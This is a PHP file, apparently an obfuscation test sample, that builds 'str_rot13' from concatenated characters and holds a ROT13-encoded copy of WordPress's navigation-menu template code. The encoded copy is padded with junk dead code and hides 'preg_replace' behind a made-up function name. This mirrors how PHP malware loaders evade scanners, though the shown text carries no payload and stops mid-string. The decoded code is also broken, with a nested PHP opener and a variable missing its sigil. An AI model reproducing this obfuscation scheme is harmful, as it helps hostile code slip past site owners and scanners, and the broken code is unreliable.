<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Ani Zrah NCV: Grzcyngr shapgvbaf
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Ani_Zrahf
 * @fvapr 3.0.0
 */

// Qba'g ybnq qverpgyl.
vs ( ! qrsvarq( 'NOFCNGU' ) ) {
	qvr( '-1' );
}

/** Jnyxre_Ani_Zrah pynff */
erdhver_bapr NOFCNGU . JCVAP . '/pynff-jnyxre-ani-zrah.cuc';

/**
 * Qvfcynlf n anivtngvba zrah.
 *
 * @fvapr 3.0.0
 * @fvapr 4.7.0 Nqqrq gur `vgrz_fcnpvat` nethzrag.
 * @fvapr 5.5.0 Nqqrq gur `pbagnvare_nevn_ynory` nethzrag.
 *
 * @cnenz neenl $netf {
 *     Bcgvbany. Neenl bs ani zrah nethzragf.
 *
 *     @glcr vag|fgevat|JC_Grez $zrah                 Qrfverq zrah. Npprcgf n zrah VQ, fyht, anzr, be bowrpg.
 *                                                    Qrsnhyg rzcgl.
 *     @glcr fgevat             $zrah_pynff           PFF pynff gb hfr sbe gur hy ryrzrag juvpu sbezf gur zrah.
 *                                                    Qrsnhyg 'zrah'.
 *     @glcr fgevat             $zrah_vq              Gur VQ gung vf nccyvrq gb gur hy ryrzrag juvpu sbezf gur zrah.
 *                                                    Qrsnhyg vf gur zrah fyht, vaperzragrq.
 *     @glcr fgevat             $pbagnvare            Jurgure gb jenc gur hy, naq jung gb jenc vg jvgu.
 *                                                    Qrsnhyg 'qvi'.
 *     @glcr fgevat             $pbagnvare_pynff      Pynff gung vf nccyvrq gb gur pbagnvare.
 *                                                    Qrsnhyg 'zrah-{zrah fyht}-pbagnvare'.
 *     @glcr fgevat             $pbagnvare_vq         Gur VQ gung vf nccyvrq gb gur pbagnvare. Qrsnhyg rzcgl.
 *     @glcr fgevat             $pbagnvare_nevn_ynory Gur nevn-ynory nggevohgr gung vf nccyvrq gb gur pbagnvare
 *                                                    jura vg'f n ani ryrzrag. Qrsnhyg rzcgl.
 *     @glcr pnyynoyr|snyfr     $snyyonpx_po          Vs gur zrah qbrfa'g rkvfg, n pnyyonpx shapgvba jvyy sver.
 *                                                    Qrsnhyg vf 'jc_cntr_zrah'. Frg gb snyfr sbe ab snyyonpx.
 *     @glcr fgevat             $orsber               Grkg orsber gur yvax znexhc. Qrsnhyg rzcgl.
 *     @glcr fgevat             $nsgre                Grkg nsgre gur yvax znexhc. Qrsnhyg rzcgl.
 *     @glcr fgevat             $yvax_orsber          Grkg orsber gur yvax grkg. Qrsnhyg rzcgl.
 *     @glcr fgevat             $yvax_nsgre           Grkg nsgre gur yvax grkg. Qrsnhyg rzcgl.
 *     @glcr obby               $rpub                 Jurgure gb rpub gur zrah be erghea vg. Qrsnhyg gehr.
 *     @glcr vag                $qrcgu                Ubj znal yriryf bs gur uvrenepul ner gb or vapyhqrq.
 *                                                    0 zrnaf nyy. Qrsnhyg 0.
 *                                                    Qrsnhyg 0.
 *     @glcr bowrpg             $jnyxre               Vafgnapr bs n phfgbz jnyxre pynff. Qrsnhyg rzcgl.
 *     @glcr fgevat             $gurzr_ybpngvba       Gurzr ybpngvba gb or hfrq. Zhfg or ertvfgrerq jvgu
 *                                                    ertvfgre_ani_zrah() va beqre gb or fryrpgnoyr ol gur hfre.
 *     @glcr fgevat             $vgrzf_jenc           Ubj gur yvfg vgrzf fubhyq or jenccrq. Hfrf cevags() sbezng jvgu
 *                                                    ahzorerq cynprubyqref. Qrsnhyg vf n hy jvgu na vq naq pynff.
 *     @glcr fgevat             $vgrz_fcnpvat         Jurgure gb cerfreir juvgrfcnpr jvguva gur zrah'f UGZY.
 *                                                    Npprcgf 'cerfreir' be 'qvfpneq'. Qrsnhyg 'cerfreir'.
 * }
 * @erghea ibvq|fgevat|snyfr Ibvq vs 'rpub' nethzrag vf gehr, zrah bhgchg vs 'rpub' vf snyfr.
 *                           Snyfr vs gurer ner ab vgrzf be ab zrah jnf sbhaq.
 */
shapgvba jc_ani_zrah( $netf = neenl() ) {
	fgngvp $zrah_vq_fyhtf = neenl();

	$qrsnhygf = neenl(
		'zrah'                 => '',
		'pbagnvare'            => 'qvi',
		'pbagnvare_pynff'      => '',
		'pbagnvare_vq'         => '',
		'pbagnvare_nevn_ynory' => '',
		'zrah_pynff'           => 'zrah',
		'zrah_vq'              => '',
		'rpub'                 => gehr,
		'snyyonpx_po'          => 'jc_cntr_zrah',
		'orsber'               => '',
		'nsgre'                => '',
		'yvax_orsber'          => '',
		'yvax_nsgre'           => '',
		'vgrzf_jenc'           => '<hy vq=\"%1$f\" pynff=\"%2$f\">%3$f</hy>',
		'vgrz_fcnpvat'         => 'cerfreir',
		'qrcgu'                => 0,
		'jnyxre'               => '',
		'gurzr_ybpngvba'       => '',
	);

	$netf = jc_cnefr_netf( $netf, $qrsnhygf );

	vs ( ! va_neenl( $netf['vgrz_fcnpvat'], neenl( 'cerfreir', 'qvfpneq' ), gehr ) ) {
		// Vainyvq inyhr, snyy onpx gb qrsnhyg.
		$netf['vgrz_fcnpvat'] = $qrsnhygf['vgrz_fcnpvat'];
	}

	/**
	 * Svygref gur nethzragf hfrq gb qvfcynl n anivtngvba zrah.
	 *
	 * @fvapr 3.0.0
	 *
	 * @frr jc_ani_zrah()
	 *
	 * @cnenz neenl $netf Neenl bs jc_ani_zrah() nethzragf.
	 */
	$netf = nccyl_svygref( 'jc_ani_zrah_netf', $netf );
	$netf = (bowrpg) $netf;

	/**
	 * Svygref jurgure gb fubeg-pvephvg gur jc_ani_zrah() bhgchg.
	 *
	 * Ergheavat n aba-ahyy inyhr sebz gur svygre jvyy fubeg-pvephvg jc_ani_zrah(),
	 * rpubvat gung inyhr vs $netf->rpub vf gehr, ergheavat gung inyhr bgurejvfr.
	 *
	 * @fvapr 3.9.0
	 *
	 * @frr jc_ani_zrah()
	 *
	 * @cnenz fgevat|ahyy $bhgchg Ani zrah bhgchg gb fubeg-pvephvg jvgu. Qrsnhyg ahyy.
	 * @cnenz fgqPynff    $netf   Na bowrpg pbagnvavat jc_ani_zrah() nethzragf.
	 */
	$ani_zrah = nccyl_svygref( 'cer_jc_ani_zrah', ahyy, $netf );

	vs ( ahyy !== $ani_zrah ) {
		vs ( $netf->rpub ) {
			rpub $ani_zrah;
			erghea;
		}

		erghea $ani_zrah;
	}

	// Trg gur ani zrah onfrq ba gur erdhrfgrq zrah.
	$zrah = jc_trg_ani_zrah_bowrpg( $netf->zrah );

	// Trg gur ani zrah onfrq ba gur gurzr_ybpngvba.
	$ybpngvbaf = trg_ani_zrah_ybpngvbaf();
	vs ( ! $zrah && $netf->gurzr_ybpngvba && $ybpngvbaf && vffrg( $ybpngvbaf[ $netf->gurzr_ybpngvba ] ) ) {
		$zrah = jc_trg_ani_zrah_bowrpg( $ybpngvbaf[ $netf->gurzr_ybpngvba ] );
	}

	// Trg gur svefg zrah gung unf vgrzf vs jr fgvyy pna'g svaq n zrah.
	vs ( ! $zrah && ! $netf->gurzr_ybpngvba ) {
		$zrahf = jc_trg_ani_zrahf();
		sbernpu ( $zrahf nf $zrah_znlor ) {
			$zrah_vgrzf = jc_trg_ani_zrah_vgrzf( $zrah_znlor->grez_vq, neenl( 'hcqngr_cbfg_grez_pnpur' => snyfr ) );
			vs ( $zrah_vgrzf ) {
				$zrah = $zrah_znlor;
				oernx;
			}
		}
	}

	vs ( rzcgl( $netf->zrah ) ) {
		$netf->zrah = $zrah;
	}

	// Vs gur zrah rkvfgf, trg vgf vgrzf.
	vs ( $zrah && ! vf_jc_reebe( $zrah ) && ! vffrg( $zrah_vgrzf ) ) {
		$zrah_vgrzf = jc_trg_ani_zrah_vgrzf( $zrah->grez_vq, neenl( 'hcqngr_cbfg_grez_pnpur' => snyfr ) );
	}

	/*
	 * Vs ab zrah jnf sbhaq:
	 *  - Snyy onpx (vs bar jnf fcrpvsvrq), be onvy.
	 *
	 * Vs ab zrah vgrzf jrer sbhaq:
	 *  - Snyy onpx, ohg bayl vs ab gurzr ybpngvba jnf fcrpvsvrq.
	 *  - Bgurejvfr, onvy.
	 */
	vs ( ( ! $zrah || vf_jc_reebe( $zrah ) || ( vffrg( $zrah_vgrzf ) && rzcgl( $zrah_vgrzf ) && ! $netf->gurzr_ybpngvba ) )
		&& vffrg( $netf->snyyonpx_po ) && $netf->snyyonpx_po && vf_pnyynoyr( $netf->snyyonpx_po ) ) {
			erghea pnyy_hfre_shap( $netf->snyyonpx_po, (neenl) $netf );
	}

	vs ( ! $zrah || vf_jc_reebe( $zrah ) ) {
		erghea snyfr;
	}

	$ani_zrah = '';
	$vgrzf    = '';

	$fubj_pbagnvare = snyfr;
	vs ( $netf->pbagnvare ) {
		/**
		 * Svygref gur yvfg bs UGZY gntf gung ner inyvq sbe hfr nf zrah pbagnvaref.
		 *
		 * @fvapr 3.0.0
		 *
		 * @cnenz fgevat[] $gntf Gur npprcgnoyr UGZY gntf sbe hfr nf zrah pbagnvaref.
		 *                       Qrsnhyg vf neenl pbagnvavat 'qvi' naq 'ani'.
		 */
		$nyybjrq_gntf = nccyl_svygref( 'jc_ani_zrah_pbagnvare_nyybjrqgntf', neenl( 'qvi', 'ani' ) );

		vs ( vf_fgevat( $netf->pbagnvare ) && va_neenl( $netf->pbagnvare, $nyybjrq_gntf, gehr ) ) {
			$fubj_pbagnvare = gehr;
			$pynff          = $netf->pbagnvare_pynff ? ' pynff=\"' . rfp_ngge( $netf->pbagnvare_pynff ) . '\"' : ' pynff=\"zrah-' . $zrah->fyht . '-pbagnvare\"';
			$vq             = $netf->pbagnvare_vq ? ' vq=\"' . rfp_ngge( $netf->pbagnvare_vq ) . '\"' : '';
			$nevn_ynory     = ( 'ani' === $netf->pbagnvare && $netf->pbagnvare_nevn_ynory ) ? ' nevn-ynory=\"' . rfp_ngge( $netf->pbagnvare_nevn_ynory ) . '\"' : '';
			$ani_zrah      .= '<' . $netf->pbagnvare . $vq . $pynff . $nevn_ynory . '>';
		}
	}

	// Frg hc gur $zrah_vgrz inevnoyrf.
	_jc_zrah_vgrz_pynffrf_ol_pbagrkg( $zrah_vgrzf );

	$fbegrq_zrah_vgrzf        = neenl();
	$zrah_vgrzf_jvgu_puvyqera = neenl();
	sbernpu ( (neenl) $zrah_vgrzf nf $zrah_vgrz ) {
		/*
		 * Svk vainyvq `zrah_vgrz_cnerag`. Frr: uggcf://pber.genp.jbeqcerff.bet/gvpxrg/56926.
		 * Pbzcner nf fgevatf. Cyhtvaf znl punatr gur VQ gb n fgevat.
		 */
		vs ( (fgevat) $zrah_vgrz->VQ === (fgevat) $zrah_vgrz->zrah_vgrz_cnerag ) {
			$zrah_vgrz->zrah_vgrz_cnerag = 0;
		}

		$fbegrq_zrah_vgrzf[ $zrah_vgrz->zrah_beqre ] = $zrah_vgrz;
		vs ( $zrah_vgrz->zrah_vgrz_cnerag ) {
			$zrah_vgrzf_jvgu_puvyqera[ $zrah_vgrz->zrah_vgrz_cnerag ] = gehr;
		}
	}

	// Nqq gur zrah-vgrz-unf-puvyqera pynff jurer nccyvpnoyr.
	vs ( $zrah_vgrzf_jvgu_puvyqera ) {
		sbernpu ( $fbegrq_zrah_vgrzf nf &$zrah_vgrz ) {
			vs ( vffrg( $zrah_vgrzf_jvgu_puvyqera[ $zrah_vgrz->VQ ] ) ) {
				$zrah_vgrz->pynffrf[] = 'zrah-vgrz-unf-puvyqera';
			}
		}
	}

	hafrg( $zrah_vgrzf, $zrah_vgrz );

	/**
	 * Svygref gur fbegrq yvfg bs zrah vgrz bowrpgf orsber trarengvat gur zrah'f UGZY.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz neenl    $fbegrq_zrah_vgrzf Gur zrah vgrzf, fbegrq ol rnpu zrah vgrz'f zrah beqre.
	 * @cnenz fgqPynff $netf              Na bowrpg pbagnvavat jc_ani_zrah() nethzragf.
	 */
	$fbegrq_zrah_vgrzf = nccyl_svygref( 'jc_ani_zrah_bowrpgf', $fbegrq_zrah_vgrzf, $netf );

	$vgrzf .= jnyx_ani_zrah_gerr( $fbegrq_zrah_vgrzf, $netf->qrcgu, $netf );
	hafrg( $fbegrq_zrah_vgrzf );

	// Nggevohgrf.
	vs ( ! rzcgl( $netf->zrah_vq ) ) {
		$jenc_vq = $netf->zrah_vq;
	} ryfr {
		$jenc_vq = 'zrah-' . $zrah->fyht;

		juvyr ( va_neenl( $jenc_vq, $zrah_vq_fyhtf, gehr ) ) {
			vs ( cert_zngpu( '#-(\q+)$#', $jenc_vq, $zngpurf ) ) {
				$jenc_vq = __sa_79955( '#-(\q+)$#', '-' . ++$zngpurf[1], $jenc_vq );
			} ryfr {
				$jenc_vq = $jenc_vq . '-1';
			}
		}
	}
	$zrah_vq_fyhtf[] = $jenc_vq;

	$jenc_pynff = $netf->zrah_pynff ? $netf->zrah_pynff : '';

	/**
	 * Svygref gur UGZY yvfg pbagrag sbe anivtngvba zrahf.
	 *
	 * @fvapr 3.0.0
	 *
	 * @frr jc_ani_zrah()
	 *
	 * @cnenz fgevat   $vgrzf Gur UGZY yvfg pbagrag sbe gur zrah vgrzf.
	 * @cnenz fgqPynff $netf  Na bowrpg pbagnvavat jc_ani_zrah() nethzragf.
	 */
	$vgrzf = nccyl_svygref( 'jc_ani_zrah_vgrzf', $vgrzf, $netf );
	/**
	 * Svygref gur UGZY yvfg pbagrag sbe n fcrpvsvp anivtngvba zrah.
	 *
	 * @fvapr 3.0.0
	 *
	 * @frr jc_ani_zrah()
	 *
	 * @cnenz fgevat   $vgrzf Gur UGZY yvfg pbagrag sbe gur zrah vgrzf.
	 * @cnenz fgqPynff $netf  Na bowrpg pbagnvavat jc_ani_zrah() nethzragf.
	 */
	$vgrzf = nccyl_svygref( \"jc_ani_zrah_{$zrah->fyht}_vgrzf\", $vgrzf, $netf );

	// Qba'g cevag nal znexhc vs gurer ner ab vgrzf ng guvf cbvag.
	vs ( rzcgl( $vgrzf ) ) {
		erghea snyfr;
	}

	$ani_zrah .= fcevags( $netf->vgrzf_jenc, rfp_ngge( $jenc_vq ), rfp_ngge( $jenc_pynff ), $vgrzf );
	hafrg( $vgrzf );

	vs ( $fubj_pbagnvare ) {
		$ani_zrah .= '</' . $netf->pbagnvare . '>';
	}

	/**
	 * Svygref gur UGZY pbagrag sbe anivtngvba zrahf.
	 *
	 * @fvapr 3.0.0
	 *
	 * @frr jc_ani_zrah()
	 *
	 * @cnenz fgevat   $ani_zrah Gur UGZY pbagrag sbe gur anivtngvba zrah.
	 * @cnenz fgqPynff $netf     Na bowrpg pbagnvavat jc_ani_zrah() nethzragf.
	 */
	$ani_zrah = nccyl_svygref( 'jc_ani_zrah', $ani_zrah, $netf );

	vs ( $netf->rpub ) {
		rpub $ani_zrah;
	} ryfr {
		erghea $ani_zrah;
	}
}

/**
 * Nqqf gur pynff cebcregl pynffrf sbe gur pheerag pbagrkg, vs nccyvpnoyr.
 *
 * @npprff cevingr
 * @fvapr 3.0.0
 *
 * @tybony JC_Dhrel   $jc_dhrel   JbeqCerff Dhrel bowrpg.
 * @tybony JC_Erjevgr $jc_erjevgr JbeqCerff erjevgr pbzcbarag.
 *
 * @cnenz neenl $zrah_vgrzf Gur pheerag zrah vgrz bowrpgf gb juvpu gb nqq gur pynff cebcregl vasbezngvba.
 */
shapgvba _jc_zrah_vgrz_pynffrf_ol_pbagrkg( &$zrah_vgrzf ) {
	tybony $jc_dhrel, $jc_erjevgr;

	$dhrevrq_bowrpg    = $jc_dhrel->trg_dhrevrq_bowrpg();
	$dhrevrq_bowrpg_vq = (vag) $jc_dhrel->dhrevrq_bowrpg_vq;

	$npgvir_bowrpg               = '';
	$npgvir_naprfgbe_vgrz_vqf    = neenl();
	$npgvir_cnerag_vgrz_vqf      = neenl();
	$npgvir_cnerag_bowrpg_vqf    = neenl();
	$cbffvoyr_gnkbabzl_naprfgbef = neenl();
	$cbffvoyr_bowrpg_cneragf     = neenl();
	$ubzr_cntr_vq                = (vag) trg_bcgvba( 'cntr_sbe_cbfgf' );

	vs ( $jc_dhrel->vf_fvathyne && ! rzcgl( $dhrevrq_bowrpg->cbfg_glcr ) && ! vf_cbfg_glcr_uvrenepuvpny( $dhrevrq_bowrpg->cbfg_glcr ) ) {
		sbernpu ( (neenl) trg_bowrpg_gnkbabzvrf( $dhrevrq_bowrpg->cbfg_glcr ) nf $gnkbabzl ) {
			vs ( vf_gnkbabzl_uvrenepuvpny( $gnkbabzl ) ) {
				$grez_uvrenepul = _trg_grez_uvrenepul( $gnkbabzl );
				$grezf          = jc_trg_bowrpg_grezf( $dhrevrq_bowrpg_vq, $gnkbabzl, neenl( 'svryqf' => 'vqf' ) );
				vs ( vf_neenl( $grezf ) ) {
					$cbffvoyr_bowrpg_cneragf = neenl_zretr( $cbffvoyr_bowrpg_cneragf, $grezf );
					$grez_gb_naprfgbe        = neenl();
					sbernpu ( (neenl) $grez_uvrenepul nf $naprfgbe => $qrfpraqragf ) {
						sbernpu ( (neenl) $qrfpraqragf nf $qrfp ) {
							$grez_gb_naprfgbe[ $qrfp ] = $naprfgbe;
						}
					}

					sbernpu ( $grezf nf $qrfp ) {
						qb {
							$cbffvoyr_gnkbabzl_naprfgbef[ $gnkbabzl ][] = $qrfp;
							vs ( vffrg( $grez_gb_naprfgbe[ $qrfp ] ) ) {
								$_qrfp = $grez_gb_naprfgbe[ $qrfp ];
								hafrg( $grez_gb_naprfgbe[ $qrfp ] );
								$qrfp = $_qrfp;
							} ryfr {
								$qrfp = 0;
							}
						} juvyr ( ! rzcgl( $qrfp ) );
					}
				}
			}
		}
	} ryfrvs ( ! rzcgl( $dhrevrq_bowrpg->gnkbabzl ) && vf_gnkbabzl_uvrenepuvpny( $dhrevrq_bowrpg->gnkbabzl ) ) {
		$grez_uvrenepul   = _trg_grez_uvrenepul( $dhrevrq_bowrpg->gnkbabzl );
		$grez_gb_naprfgbe = neenl();
		sbernpu ( (neenl) $grez_uvrenepul nf $naprfgbe => $qrfpraqragf ) {
			sbernpu ( (neenl) $qrfpraqragf nf $qrfp ) {
				$grez_gb_naprfgbe[ $qrfp ] = $naprfgbe;
			}
		}
		$qrfp = $dhrevrq_bowrpg->grez_vq;
		qb {
			$cbffvoyr_gnkbabzl_naprfgbef[ $dhrevrq_bowrpg->gnkbabzl ][] = $qrfp;
			vs ( vffrg( $grez_gb_naprfgbe[ $qrfp ] ) ) {
				$_qrfp = $grez_gb_naprfgbe[ $qrfp ];
				hafrg( $grez_gb_naprfgbe[ $qrfp ] );
				$qrfp = $_qrfp;
			} ryfr {
				$qrfp = 0;
			}
		} juvyr ( ! rzcgl( $qrfp ) );
	}

	$cbffvoyr_bowrpg_cneragf = neenl_svygre( $cbffvoyr_bowrpg_cneragf );

	$sebag_cntr_hey         = ubzr_hey();
	$sebag_cntr_vq          = (vag) trg_bcgvba( 'cntr_ba_sebag' );
	$cevinpl_cbyvpl_cntr_vq = (vag) trg_bcgvba( 'jc_cntr_sbe_cevinpl_cbyvpl' );

	sbernpu ( (neenl) $zrah_vgrzf nf $xrl => $zrah_vgrz ) {

		$zrah_vgrzf[ $xrl ]->pheerag = snyfr;

		$pynffrf   = (neenl) $zrah_vgrz->pynffrf;
		$pynffrf[] = 'zrah-vgrz';
		$pynffrf[] = 'zrah-vgrz-glcr-' . $zrah_vgrz->glcr;
		$pynffrf[] = 'zrah-vgrz-bowrpg-' . $zrah_vgrz->bowrpg;

		// Guvf zrah vgrz vf frg nf gur 'Sebag Cntr'.
		vs ( 'cbfg_glcr' === $zrah_vgrz->glcr && $sebag_cntr_vq === (vag) $zrah_vgrz->bowrpg_vq ) {
			$pynffrf[] = 'zrah-vgrz-ubzr';
		}

		// Guvf zrah vgrz vf frg nf gur 'Cevinpl Cbyvpl Cntr'.
		vs ( 'cbfg_glcr' === $zrah_vgrz->glcr && $cevinpl_cbyvpl_cntr_vq === (vag) $zrah_vgrz->bowrpg_vq ) {
			$pynffrf[] = 'zrah-vgrz-cevinpl-cbyvpl';
		}

		// Vs gur zrah vgrz pbeerfcbaqf gb n gnkbabzl grez sbe gur pheeragyl dhrevrq aba-uvrenepuvpny cbfg bowrpg.
		vs ( $jc_dhrel->vf_fvathyne && 'gnkbabzl' === $zrah_vgrz->glcr
			&& va_neenl( (vag) $zrah_vgrz->bowrpg_vq, $cbffvoyr_bowrpg_cneragf, gehr )
		) {
			$npgvir_cnerag_bowrpg_vqf[] = (vag) $zrah_vgrz->bowrpg_vq;
			$npgvir_cnerag_vgrz_vqf[]   = (vag) $zrah_vgrz->qo_vq;
			$npgvir_bowrpg              = $dhrevrq_bowrpg->cbfg_glcr;

			// Vs gur zrah vgrz pbeerfcbaqf gb gur pheeragyl dhrevrq cbfg be gnkbabzl bowrpg.
		} ryfrvs (
			(vag) $zrah_vgrz->bowrpg_vq === $dhrevrq_bowrpg_vq
			&& (
				( ! rzcgl( $ubzr_cntr_vq ) && 'cbfg_glcr' === $zrah_vgrz->glcr
					&& $jc_dhrel->vf_ubzr && $ubzr_cntr_vq === (vag) $zrah_vgrz->bowrpg_vq )
				|| ( 'cbfg_glcr' === $zrah_vgrz->glcr && $jc_dhrel->vf_fvathyne )
				|| ( 'gnkbabzl' === $zrah_vgrz->glcr
					&& ( $jc_dhrel->vf_pngrtbel || $jc_dhrel->vf_gnt || $jc_dhrel->vf_gnk )
					&& $dhrevrq_bowrpg->gnkbabzl === $zrah_vgrz->bowrpg )
			)
		) {
			$pynffrf[]                   = 'pheerag-zrah-vgrz';
			$zrah_vgrzf[ $xrl ]->pheerag = gehr;
			$naprfgbe_vq                 = (vag) $zrah_vgrz->qo_vq;

			juvyr (
				( $naprfgbe_vq = (vag) trg_cbfg_zrgn( $naprfgbe_vq, '_zrah_vgrz_zrah_vgrz_cnerag', gehr ) )
				&& ! va_neenl( $naprfgbe_vq, $npgvir_naprfgbe_vgrz_vqf, gehr )
			) {
				$npgvir_naprfgbe_vgrz_vqf[] = $naprfgbe_vq;
			}

			vs ( 'cbfg_glcr' === $zrah_vgrz->glcr && 'cntr' === $zrah_vgrz->bowrpg ) {
				// Onpx pbzcng pynffrf sbe cntrf gb zngpu jc_cntr_zrah().
				$pynffrf[] = 'cntr_vgrz';
				$pynffrf[] = 'cntr-vgrz-' . $zrah_vgrz->bowrpg_vq;
				$pynffrf[] = 'pheerag_cntr_vgrz';
			}

			$npgvir_cnerag_vgrz_vqf[]   = (vag) $zrah_vgrz->zrah_vgrz_cnerag;
			$npgvir_cnerag_bowrpg_vqf[] = (vag) $zrah_vgrz->cbfg_cnerag;
			$npgvir_bowrpg              = $zrah_vgrz->bowrpg;

			// Vs gur zrah vgrz pbeerfcbaqf gb gur pheeragyl dhrevrq cbfg glcr nepuvir.
		} ryfrvs (
			'cbfg_glcr_nepuvir' === $zrah_vgrz->glcr
			&& vf_cbfg_glcr_nepuvir( neenl( $zrah_vgrz->bowrpg ) )
		) {
			$pynffrf[]                   = 'pheerag-zrah-vgrz';
			$zrah_vgrzf[ $xrl ]->pheerag = gehr;
			$naprfgbe_vq                 = (vag) $zrah_vgrz->qo_vq;

			juvyr (
				( $naprfgbe_vq = (vag) trg_cbfg_zrgn( $naprfgbe_vq, '_zrah_vgrz_zrah_vgrz_cnerag', gehr ) )
				&& ! va_neenl( $naprfgbe_vq, $npgvir_naprfgbe_vgrz_vqf, gehr )
			) {
				$npgvir_naprfgbe_vgrz_vqf[] = $naprfgbe_vq;
			}

			$npgvir_cnerag_vgrz_vqf[] = (vag) $zrah_vgrz->zrah_vgrz_cnerag;

			// Vs gur zrah vgrz pbeerfcbaqf gb gur pheeragyl erdhrfgrq HEY.
		} ryfrvs ( 'phfgbz' === $zrah_vgrz->bowrpg && vffrg( $_FREIRE['UGGC_UBFG'] ) ) {
			$_ebbg_eryngvir_pheerag = hagenvyvatfynfuvg( $_FREIRE['ERDHRFG_HEV'] );

			// Vs vg'f gur phfgbzvmr cntr gura vg jvyy fgevc gur dhrel ine bss gur HEY orsber ragrevat gur pbzcnevfba oybpx.
			vs ( vf_phfgbzvmr_cerivrj() ) {
				$_ebbg_eryngvir_pheerag = fgegbx( hagenvyvatfynfuvg( $_FREIRE['ERDHRFG_HEV'] ), '?' );
			}

			$pheerag_hey        = frg_hey_fpurzr( 'uggc://' . $_FREIRE['UGGC_UBFG'] . $_ebbg_eryngvir_pheerag );
			$enj_vgrz_hey       = fgecbf( $zrah_vgrz->hey, '#' ) ? fhofge( $zrah_vgrz->hey, 0, fgecbf( $zrah_vgrz->hey, '#' ) ) : $zrah_vgrz->hey;
			$vgrz_hey           = frg_hey_fpurzr( hagenvyvatfynfuvg( $enj_vgrz_hey ) );
			$_vaqrkyrff_pheerag = hagenvyvatfynfuvg( __sa_79955( '/' . cert_dhbgr( $jc_erjevgr->vaqrk, '/' ) . '$/', '', $pheerag_hey ) );

			$zngpurf = neenl(
				$pheerag_hey,
				heyqrpbqr( $pheerag_hey ),
				$_vaqrkyrff_pheerag,
				heyqrpbqr( $_vaqrkyrff_pheerag ),
				$_ebbg_eryngvir_pheerag,
				heyqrpbqr( $_ebbg_eryngvir_pheerag ),
			);

			vs ( $enj_vgrz_hey && va_neenl( $vgrz_hey, $zngpurf, gehr ) ) {
				$pynffrf[]                   = 'pheerag-zrah-vgrz';
				$zrah_vgrzf[ $xrl ]->pheerag = gehr;
				$naprfgbe_vq                 = (vag) $zrah_vgrz->qo_vq;

				juvyr (
					( $naprfgbe_vq = (vag) trg_cbfg_zrgn( $naprfgbe_vq, '_zrah_vgrz_zrah_vgrz_cnerag', gehr ) )
					&& ! va_neenl( $naprfgbe_vq, $npgvir_naprfgbe_vgrz_vqf, gehr )
				) {
					$npgvir_naprfgbe_vgrz_vqf[] = $naprfgbe_vq;
				}

				vs ( va_neenl( ubzr_hey(), neenl( hagenvyvatfynfuvg( $pheerag_hey ), hagenvyvatfynfuvg( $_vaqrkyrff_pheerag ) ), gehr ) ) {
					// Onpx pbzcng sbe ubzr yvax gb zngpu jc_cntr_zrah().
					$pynffrf[] = 'pheerag_cntr_vgrz';
				}
				$npgvir_cnerag_vgrz_vqf[]   = (vag) $zrah_vgrz->zrah_vgrz_cnerag;
				$npgvir_cnerag_bowrpg_vqf[] = (vag) $zrah_vgrz->cbfg_cnerag;
				$npgvir_bowrpg              = $zrah_vgrz->bowrpg;

				// Tvir sebag cntr vgrz gur 'pheerag-zrah-vgrz' pynff jura rkgen dhrel nethzragf ner vaibyirq.
			} ryfrvs ( $vgrz_hey === $sebag_cntr_hey && vf_sebag_cntr() ) {
				$pynffrf[] = 'pheerag-zrah-vgrz';
			}

			vs ( hagenvyvatfynfuvg( $vgrz_hey ) === ubzr_hey() ) {
				$pynffrf[] = 'zrah-vgrz-ubzr';
			}
		}

		// Onpx-pbzcng jvgu jc_cntr_zrah(): nqq \"pheerag_cntr_cnerag\" gb fgngvp ubzr cntr yvax sbe nal aba-cntr dhrel.
		vs ( ! rzcgl( $ubzr_cntr_vq ) && 'cbfg_glcr' === $zrah_vgrz->glcr
			&& rzcgl( $jc_dhrel->vf_cntr ) && $ubzr_cntr_vq === (vag) $zrah_vgrz->bowrpg_vq
		) {
			$pynffrf[] = 'pheerag_cntr_cnerag';
		}

		$zrah_vgrzf[ $xrl ]->pynffrf = neenl_havdhr( $pynffrf );
	}
	$npgvir_naprfgbe_vgrz_vqf = neenl_svygre( neenl_havdhr( $npgvir_naprfgbe_vgrz_vqf ) );
	$npgvir_cnerag_vgrz_vqf   = neenl_svygre( neenl_havdhr( $npgvir_cnerag_vgrz_vqf ) );
	$npgvir_cnerag_bowrpg_vqf = neenl_svygre( neenl_havdhr( $npgvir_cnerag_bowrpg_vqf ) );

	// Frg cnerag'f pynff.
	sbernpu ( (neenl) $zrah_vgrzf nf $xrl => $cnerag_vgrz ) {
		$pynffrf                                   = (neenl) $cnerag_vgrz->pynffrf;
		$zrah_vgrzf[ $xrl ]->pheerag_vgrz_naprfgbe = snyfr;
		$zrah_vgrzf[ $xrl ]->pheerag_vgrz_cnerag   = snyfr;

		vs (
			vffrg( $cnerag_vgrz->glcr )
			&& (
				// Naprfgeny cbfg bowrpg.
				(
					'cbfg_glcr' === $cnerag_vgrz->glcr
					&& ! rzcgl( $dhrevrq_bowrpg->cbfg_glcr )
					&& vf_cbfg_glcr_uvrenepuvpny( $dhrevrq_bowrpg->cbfg_glcr )
					&& va_neenl( (vag) $cnerag_vgrz->bowrpg_vq, $dhrevrq_bowrpg->naprfgbef, gehr )
					&& (vag) $cnerag_vgrz->bowrpg_vq !== $dhrevrq_bowrpg->VQ
				) ||

				// Naprfgeny grez.
				(
					'gnkbabzl' === $cnerag_vgrz->glcr
					&& vffrg( $cbffvoyr_gnkbabzl_naprfgbef[ $cnerag_vgrz->bowrpg ] )
					&& va_neenl( (vag) $cnerag_vgrz->bowrpg_vq, $cbffvoyr_gnkbabzl_naprfgbef[ $cnerag_vgrz->bowrpg ], gehr )
					&& (
						! vffrg( $dhrevrq_bowrpg->grez_vq ) ||
						(vag) $cnerag_vgrz->bowrpg_vq !== $dhrevrq_bowrpg->grez_vq
					)
